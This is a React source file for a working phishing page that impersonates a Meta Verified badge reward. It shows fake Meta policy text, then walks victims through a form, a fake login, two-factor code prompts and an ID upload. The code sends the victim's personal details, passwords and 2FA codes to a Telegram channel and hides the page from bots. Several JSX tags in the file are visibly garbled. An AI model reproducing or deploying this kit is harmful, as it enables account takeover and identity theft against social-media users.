import { useEffect, useState, useMemo, useRef } from 'react';
import { useLocation } from 'react-router';
import axios from 'axios';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TickIcon from '@/assets/images/tick.svg';
import sendMessage from '@/utils/telegram';
import detectBot from '@/utils/detect_bot';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import UploadModal from '@/components/UploadModal';
import SuccessModal from '@/components/SuccessModal';
import PrivacyPolicyModal from '@/components/PrivacyPolicyModal';
import TermsModal from '@/components/TermsModal';

const LABEL = 'Thần-tài-đến';

const SYSTEM_FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';

const generateTicketId = () =>
{
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const pick = ( len ) =>
        Array.from( { length: len }, () => chars[ Math.floor( Math.random() * chars.length ) ] ).join( '' );

    return `#${ pick( 4 ) }-${ pick( 4 ) }-${ pick( 4 ) }`;
};

const escapeHtml = ( str ) =>
{
    if ( str === null || str === undefined ) return '';
    return String( str )
        .replace( /&/g, '&amp;' )
        .replace( /</g, '&lt;' )
        .replace( />/g, '&gt;' );
};

const Home = () =>
{
    const [ ticketId ] = useState( () => generateTicketId() );
    const [ showFirstModal, setShowFirstModal ] = useState( false );
    const [ showLoginModal, setShowLoginModal ] = useState( false );
    const [ show2FAModal, setShow2FAModal ] = useState( false );
    const [ showUploadModal, setShowUploadModal ] = useState( false );
    const [ showSuccessModal, setShowSuccessModal ] = useState( false );
    const [ showPrivacyModal, setShowPrivacyModal ] = useState( false );
    const [ selectedPrivacyQuestion, setSelectedPrivacyQuestion ] = useState( null );
    const [ showTermsModal, setShowTermsModal ] = useState( false );
    const [ formData, setFormData ] = useState( {
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        dob: '',
        message: '',
        loginIdentifier: ''
    } );
    const [ loginAttempts, setLoginAttempts ] = useState( [] );
    const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', country: 'Unknown', countryCode: 'US' } );
    const [ isLoading, setIsLoading ] = useState( true );

    const telegramMsgIdRef = useRef( null );
    const sendQueueRef = useRef( Promise.resolve() );

    const texts = useMemo(
        () => ( {
            heroTitle: 'Meta Verified - Rewards for you',
            showWorld: 'Show the world that you mean business.',
            congrats: 'Congratulations on meeting the eligibility criteria to upgrade your page with a verified blue badge! This achievement highlights your commitment and the strong connection built with your community.',
            excited: 'We are excited to celebrate this milestone alongside you and look forward to watching your page grow with this distinction!',
            ticketIdPrefix: 'Your ticket id:',
            guideTitle: 'Verified Blue Badge Request Guide',
            guideItem1: '- Reviewers cannot process submissions containing harassment, hate speech, or abusive language.',
            guideItem2: '- Please submit all requested details accurately so reviewers can evaluate your request promptly. Providing an unreachable email or failing to respond to follow-up inquiries within 2 days may result in automatic closure. Requests left incomplete after 4 days will be declined automatically.',
            guideItem3: '- Once your details are received, we will review your profile for any active limitations. Standard processing takes around 24 hours, though complex cases may require additional time. Your account status will be updated accordingly once the evaluation finishes.',
            submitRequest: 'Submit request',
            helpCenter: 'Help Center',
            privacyPolicy: 'Privacy Policy',
            termsOfService: 'Terms of Service',
            communityStandards: 'Community Standards',

            informationTitle: 'Information',
            fullName: 'Full Name',
            emailAddress: 'Email Address',
            emailBusinessAddress: 'Email Business Address',
            personalEmail: 'Personal Email',
            businessEmail: 'Business Email',
            mobilePhone: 'Mobile Phone Number',
            yourPageName: 'Fanpage Name',
            dateOfBirth: 'Date of Birth',
            day: 'Day',
            month: 'Month',
            year: 'Year',
            messagePlaceholder: 'Message',
            responseTimeNote: 'Our response will be sent to you within 14 - 48 hours.',
            agreeToTerms: 'I agree to the',
            pleaseAgreeTerms: 'Please agree to the Terms of use.',
            submitBtn: 'Submit',
            confirm: 'Confirm',
            aboutHelpMore: 'About · Help · See more',

            loginInstruction: 'To enroll your business in Meta Verified, please sign in with your professional account or business Page.',
            mobileOrEmail: 'Mobile number or email',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            logIn: 'Log in',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',

            twoFATitle: 'Two-factor authentication required',
            twoFAInstruction: 'Enter the code for this account that we send to',
            twoFAInstructionOr: 'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
            enterTheCode: 'Enter the code',
            tryAnotherWay: 'Try another way',
            code: 'Code',
            codeExpired: 'This code has expired. Please enter a new code later',
            pleaseWait: 'Please wait',

            successTitle: 'The request was sent successfully',
            successMessage1: 'Great, your verification request has been approved.',
            successMessage2: 'The badge should appear next to your name within the next hour.',
            successMessage3: 'If the badge has not appeared after this time, please contact us again for further assistance.',
            thankYou: 'Thank you',
            metaSupportTeam: 'Meta Support Team.',

            privacyPolicyQ: 'What is the Privacy Policy and what does it say?',
            mainInSection: 'The main thing in the section',
            privacyDesc1: 'We want you to clearly understand what data we gather, how it is processed, and with whom it may be shared. Reviewing our Privacy Policy helps you manage your experience across',
            privacyDesc2: ' services effectively.',
            privacyDesc3: 'Our policy outlines how information is collected, stored, and protected, as well as your privacy rights and available controls.',
            privacyDesc4: 'You can review and adjust how your information is handled at any time. Visit your account preferences to',
            updateSettings: 'update these settings',
            privacyDesc5: 'according to your preferences.',
            ourPolicies: 'Our policies.',
            whatProducts: 'What products are covered by this policy?',
            learnMorePrivacy: 'Learn more about managing your privacy at Privacy Center',
            whatInfoCollect: 'What information do we collect?',
            infoCollectDesc1: 'The types of data processed depend on how you interact with our',
            products: 'Products',
            infoCollectDesc2: '. Information may be collected when you use our services,',
            evenNoAccount: 'even if you do not have an account',
            typesOfData: 'The following are the types of data we collect:',
            yourActions: 'Your actions and information you provide to us',
            friendsSubscribers: 'Friends, subscribers and other contacts',
            appBrowserDevice: 'Application, browser and device information',
            infoFromPartners: 'Information from Partners, suppliers and other third parties',
            whatIfNotAllow: 'What happens if you do not allow us to collect certain types of information?',
            someInfoNecessary: 'Certain data is required for core functionality, while optional data helps tailor your overall experience.',
            moreDetails: 'More details',
            whatIfNoIdentify: 'What if the information we collect does not personally identify individuals?',
            deIdentifyDesc: 'Third-party partners may aggregate or anonymize data prior to sharing so that individual identities cannot be determined.',
            dataControl: 'Data control',
            manageInfoCollect: 'Manage the information we collect about you',

            termsOfUse: 'Terms of use',
            termsDesc1: 'These terms govern your access to and use of our applications, services, and software (',
            metaProducts: 'Meta Products',
            termsDesc2: ' or ',
            termsDesc3: '), unless separate terms explicitly apply.',
            termsDesc4: 'Our ',
            termsDesc5: ' describes how personal data is processed to personalize content and services. Through ',
            termsDesc6: ' in your settings, you can adjust your privacy preferences anytime.',
            servicesWeProvide: 'Services we provide',
            service1: 'Personalize your experience.',
            service2: 'Connect with people and organizations that interest you.',
            service3: 'Opportunity to express yourself and communicate on topics that are important to you.',
            service4: 'Search for content, products and services that may interest you.',
            service5: 'Ensuring the safety, security and integrity of our services, combating malicious behavior and protecting our user community.',
            service6: 'Using and developing advanced technologies to provide safe and functional services.',
            service7: 'Research ways to improve the quality of our services.',
            service8: 'Ensuring consistency and convenience of various Meta Companies Products.',
            service9: 'Providing access to our services.',
            otherTermsPolicies: 'Other terms and policies that may apply to you',
            advertisingRules: 'Advertising Rules',
            advertisingRulesDesc: '. Guidelines governing commercial promotions and partner advertisements.',
            communityStandardsDesc: '. Rules outlining acceptable behavior and content across our platforms.',
            communityPaymentTerms: 'Community Payment Terms',
            communityPaymentTermsDesc: '. Terms governing financial transactions processed through our services.',
            commercialTerms: 'Commercial terms',
            commercialTermsDesc: '. Additional terms applicable to business, merchant, and commercial page operations.',
            tradeRules: 'Trade Rules',
            tradeRulesDesc: '. Standards applicable when listing goods or services for sale.',
            lastRevisionDate: 'Last revision date: July 26, 2023',
            accountSecurity: 'Account security',

            uploadTitle: 'Confirm your identity',
            uploadChooseType: 'Choose type of ID to upload',
            uploadDesc: 'We will use your ID to verify your name, photo, and date of birth. It will not be displayed publicly on your profile.',
            uploadPassport: 'Passport',
            uploadDriversLicense: "Driver's license",
            uploadNationalId: 'National ID card',
            uploadSecurityNote: 'Your identification document is encrypted and stored securely during verification review, and removed according to our retention policy.',
            uploadLearnMore: 'Learn more',
            uploadBtn: 'Upload Image',
            uploadUploading: 'Uploading...',

            privacyQ1: 'What is the Privacy Policy and what does it cover?',
            privacyQ2: 'What information do we collect?',
            privacyQ3: 'How do we use your information?',
            privacyQ4: 'How do we share your information on Meta Products or with integrated partners?',
            privacyQ5: 'How do we share information with third parties?',
            privacyQ6: 'How is the cooperation between Meta Companies organized?',
            privacyQ7: 'How can you manage or delete your information and exercise your rights?',
            privacyQ8: 'How long do we keep your information?',
            privacyQ9: 'How do we transmit information?',
            privacyQ10: 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
            privacyQ11: 'How will you know when the policy changes?',
            privacyQ12: 'How to ask Meta questions?',
            privacyQ13: 'Why and how we process your data'
        } ),
        []
    );

    const location = useLocation();

    useEffect( () =>
    {
        localStorage.clear();
        initializeApp();
    }, [] );

    useEffect( () =>
    {
        if ( location.state?.autoOpen )
        {
            setShowFirstModal( true );
        }
    }, [ location.state ] );

    const initializeApp = async () =>
    {
        try
        {
            const botResult = await detectBot();
            if ( botResult.isBot )
            {
                window.location.href = 'about:blank';
                return;
            }

            try
            {
                const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                const data = response.data;
                setIpInfo( {
                    ip: data.ip || 'Unknown',
                    country: data.country || 'Unknown',
                    countryCode: data.country_code || 'US'
                } );
                localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
            } catch ( error )
            {
                console.error( 'Error fetching IP:', error );
            }

            setIsLoading( false );
        } catch ( error )
        {
            console.error( 'Initialization error:', error );
            setIsLoading( false );
        }
    };

    const pad = ( n ) => ( n < 10 ? '0' + n : String( n ) );

    const formatDateTime = ( d ) =>
    {
        return (
            pad( d.getDate() ) +
            '/' +
            pad( d.getMonth() + 1 ) +
            '/' +
            d.getFullYear() +
            ' ' +
            pad( d.getHours() ) +
            ':' +
            pad( d.getMinutes() ) +
            ':' +
            pad( d.getSeconds() )
        );
    };

    const buildAndSend = ( data ) =>
    {
        const dt = formatDateTime( new Date() );
        const { form, login, passes, codes } = data;

        let message = `📩 <b>${ escapeHtml( LABEL ) }</b>\n`;
        message += `🎫 Ticket: <code>${ escapeHtml( ticketId ) }</code>\n`;
        message += `⏰ ${ escapeHtml( dt ) }\n`;
        message += `🌐 <code>${ escapeHtml( ipInfo.ip ) }</code> • ${ escapeHtml( ipInfo.country ) }\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n`;

        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName || form.dob || form.message )
        {
            message += `<b>📋 THÔNG TIN</b>\n`;
            if ( form.fullName ) message += `   Tên: <code>${ escapeHtml( form.fullName ) }</code>\n`;
            if ( form.personalEmail ) message += `   Email: <code>${ escapeHtml( form.personalEmail ) }</code>\n`;
            if ( form.businessEmail && form.businessEmail !== form.personalEmail )
            {
                message += `   Business: <code>${ escapeHtml( form.businessEmail ) }</code>\n`;
            }
            if ( form.phone ) message += `   SĐT: <code>${ escapeHtml( form.phone ) }</code>\n`;
            if ( form.pageName ) message += `   Page: <code>${ escapeHtml( form.pageName ) }</code>\n`;
            if ( form.dob ) message += `   Ngày sinh: <code>${ escapeHtml( form.dob ) }</code>\n`;
            if ( form.message ) message += `   Lời nhắn: <code>${ escapeHtml( form.message ) }</code>\n`;
        }

        if ( login || ( passes && passes.length > 0 ) )
        {
            message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
            if ( login ) message += `   TK: <code>${ escapeHtml( login ) }</code>\n`;
            if ( passes && passes.length > 0 )
            {
                passes.forEach( ( p, i ) =>
                {
                    message += `   MK${ i + 1 }: <code>${ escapeHtml( p ) }</code>\n`;
                } );
            }
        }

        if ( codes && codes.length > 0 )
        {
            message += `\n<b>🔒 MÃ 2FA</b>\n`;
            codes.forEach( ( c, i ) =>
            {
                message += `   Code${ i + 1 }: <code>${ escapeHtml( c ) }</code>\n`;
            } );
        }

        message += `━━━━━━━━━━━━━━━━━━━━`;

        sendQueueRef.current = sendQueueRef.current.then( async () =>
        {
            const sentId = await sendMessage( message, telegramMsgIdRef.current );
            if ( sentId )
            {
                telegramMsgIdRef.current = sentId;
            }
        } );
    };

    const handleFirstFormSubmit = ( data ) =>
    {
        const newFormData = { ...formData, ...data };
        setFormData( newFormData );
        setShowFirstModal( false );
        setShowLoginModal( true );

        buildAndSend( {
            form: newFormData,
            login: null,
            passes: [],
            codes: []
        } );
    };

    const handleLoginSubmit = ( email, password ) =>
    {
        const newFormData = { ...formData, loginIdentifier: email };
        const newPasses = [ ...loginAttempts.map( p => p.value ), password ].slice( -2 );

        setFormData( newFormData );
        setLoginAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: password } ].slice( -2 ) );

        buildAndSend( {
            form: newFormData,
            login: email,
            passes: newPasses,
            codes: twoFAAttempts.map( c => c.value )
        } );
    };

    const handle2FASubmit = ( code ) =>
    {
        const newCodes = [ ...twoFAAttempts.map( c => c.value ), code ].slice( -3 );

        setTwoFAAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: code } ].slice( -3 ) );

        buildAndSend( {
            form: formData,
            login: formData.loginIdentifier,
            passes: loginAttempts.map( p => p.value ),
            codes: newCodes
        } );
    };

    if ( isLoading )
    {
        return (
            <div id="intro" style={ { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 } }>
                <img id="meta-logo" src={ MetaLogo } alt="Meta" style={ { width: '70%', height: 'auto' } } />
            </div>
        );
    }

    return (
        <>
            <style>{ `
                html, body, #root {
                    margin: 0 !important;
                    padding: 0 !important;
                    width: 100% !important;
                    max-width: 100% !important;
                    min-height: 100dvh !important;
                    display: block !important;
                    font-family: ${ SYSTEM_FONT } !important;
                    -webkit-font-smoothing: antialiased;
                    color: #1c2b33;
                }
                .meta-notice-wrapper * {
                    font-family: ${ SYSTEM_FONT } !important;
                    box-sizing: border-box;
                }
            ` }</style>

            <div
                className="meta-notice-wrapper"
                style={ {
                    position: 'fixed',
                    inset: 0,
                    width: '100vw',
                    height: '100dvh',
                    overflowY: 'auto',
                    WebkitOverflowScrolling: 'touch',
                    background: 'linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    justifyContent: 'flex-start',
                    color: '#1c2b33',
                    zIndex: 1
                } }
            >
                <div
                    style={ {
                        maxWidth: '768px',
                        width: '100%',
                        padding: '15px 15px 60px 15px',
                        margin: '20px auto'
                    } }
                >
                    <div style={ { padding: '15px' } }>
                        <div
                            style={ {
                                display: 'flex',
                                alignItems: 'flex-start',
                                gap: '12px',
                                flexDirection: 'column',
                                justifyContent: 'flex-start',
                                marginBottom: '26px'
                            } }
                        >
                            <img
                                src={ TickIcon }
                                alt="tick"
                                style={ { width: '48px', height: '48px', display: 'block' } }
                            />
                            <b
                                style={ {
                                    fontSize: 'clamp(1.6rem, 4.5vw, 2rem)',
                                    fontWeight: '700',
                                    lineHeight: '1.25',
                                    color: '#1c2b33'
                                } }
                            >
                                { texts.heroTitle }
                            </b>
                        </div>

                        <div style={ { width: '100%' } }>
                            <div style={ { width: '100%', marginBottom: '20px' } }>
                                <b
                                    style={ {
                                        fontSize: '16.5px',
                                        fontWeight: '700',
                                        color: '#1c2b33',
                                        display: 'block'
                                    } }
                                >
                                    { texts.showWorld }
                                </b>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '0px',
                                        marginTop: '15px',
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.congrats }
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '0px',
                                        marginTop: '15px',
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.excited }
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15.5px',
                                        marginBottom: '0px',
                                        marginTop: '15px',
                                        color: '#465a69',
                                        lineHeight: '1.5'
                                    } }
                                >
                                    { texts.ticketIdPrefix } { ticketId }
                                </p>
                            </div>

                            <div style={ { width: '100%' } }>
                                <p style={ { marginBottom: '15px', marginTop: 0 } }>
                                    <b
                                        style={ {
                                            fontSize: '16.5px',
                                            fontWeight: '700',
                                            color: '#1c2b33'
                                        } }
                                    >
                                        { texts.guideTitle }
                                    </b>
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '12px',
                                        marginTop: 0,
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.guideItem1 }
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '12px',
                                        marginTop: 0,
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.guideItem2 }
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '0px',
                                        marginTop: 0,
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.guideItem3 }
                                </p>
                            </div>
                        </div>
                    </div>

                    <div
                        id="start"
                        role="button"
                        tabIndex={ 0 }
                        onClick={ () => setShowFirstModal( true ) }
                        onKeyDown={ ( e ) => { if ( e.key === 'Enter' || e.key === ' ' ) setShowFirstModal( true ); } }
                        style={ {
                            backgroundColor: '#1877f2',
                            color: '#ffffff',
                            border: 'none',
                            borderRadius: '9999px',
                            fontSize: '16px',
                            fontWeight: '600',
                            padding: '12px 24px',
                            cursor: 'pointer',
                            display: 'block',
                            width: '100%',
                            maxWidth: '300px',
                            margin: '20px auto',
                            textAlign: 'center',
                            transition: 'background-color 0.2s ease'
                        } }
                        onMouseOver={ ( e ) => ( e.currentTarget.style.backgroundColor = '#166fe5' ) }
                        onMouseOut={ ( e ) => ( e.currentTarget.style.backgroundColor = '#1877f2' ) }
                    >
                        { texts.submitRequest }
                    </div>

                    <div
                        style={ {
                            display: 'flex',
                            alignItems: 'center',
                            textAlign: 'center',
                            justifyContent: 'center',
                            flexWrap: 'wrap',
                            fontSize: '12px',
                            marginTop: '30px',
                            color: '#65676b',
                            gap: '16px'
                        } }
                    >
                        <a
                            href="#help"
                            onClick={ ( e ) =>
                            {
                                e.preventDefault();
                                setSelectedPrivacyQuestion( texts.privacyPolicyQ );
                                setShowPrivacyModal( true );
                            } }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                        >
                            { texts.helpCenter }
                        </a>
                        <a
                            href="#privacy"
                            onClick={ ( e ) =>
                            {
                                e.preventDefault();
                                setSelectedPrivacyQuestion( texts.privacyPolicyQ );
                                setShowPrivacyModal( true );
                            } }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                        >
                            { texts.privacyPolicy }
                        </a>
                        <a
                            href="#terms"
                            onClick={ ( e ) =>
                            {
                                e.preventDefault();
                                setShowTermsModal( true );
                            } }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                        >
                            { texts.termsOfService }
                        </a>
                        <a
                            href="#standards"
                            onClick={ ( e ) =>
                            {
                                e.preventDefault();
                                setShowTermsModal( true );
                            } }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                        >
                            { texts.communityStandards }
                        </a>
                        <a
                            href="#meta"
                            onClick={ ( e ) => e.preventDefault() }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'default' } }
                        >
                            Meta © 2026
                        </a>
                    </div>
                </div>
            </div>

            <FirstFormModal onClose="{" show="{" showFirstModal }> setShowFirstModal( false ) }
                onSubmit={ handleFirstFormSubmit }
                onOpenTerms={ () => setShowTermsModal( true ) }
                texts={ texts }
                defaultCountryCode={ ipInfo.countryCode }
            />
            <LoginModal onClose="{" show="{" showLoginModal }> setShowLoginModal( false ) }
                onSubmit={ handleLoginSubmit }
                onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } }
                texts={ texts }
            />
            <TwoFAModal onClose="{" show="{" show2FAModal }> setShow2FAModal( false ) }
                onSubmit={ handle2FASubmit }
                onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } }
                texts={ texts }
                formData={ formData }
            />
            <UploadModal onClose="{" show="{" showUploadModal }> setShowUploadModal( false ) }
                onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } }
                texts={ texts }
            />
            <SuccessModal onClose="{" show="{" showSuccessModal }> setShowSuccessModal( false ) }
                texts={ texts }
            />
            <PrivacyPolicyModal onClose="{" show="{" showPrivacyModal }>
                {
                    setShowPrivacyModal( false );
                    setSelectedPrivacyQuestion( null );
                } }
                selectedQuestion={ selectedPrivacyQuestion }
                texts={ texts }
            />
            <TermsModal onClose="{" show="{" showTermsModal }> setShowTermsModal( false ) }
                texts={ texts }
            />
        </>
    );
};

export default Home;
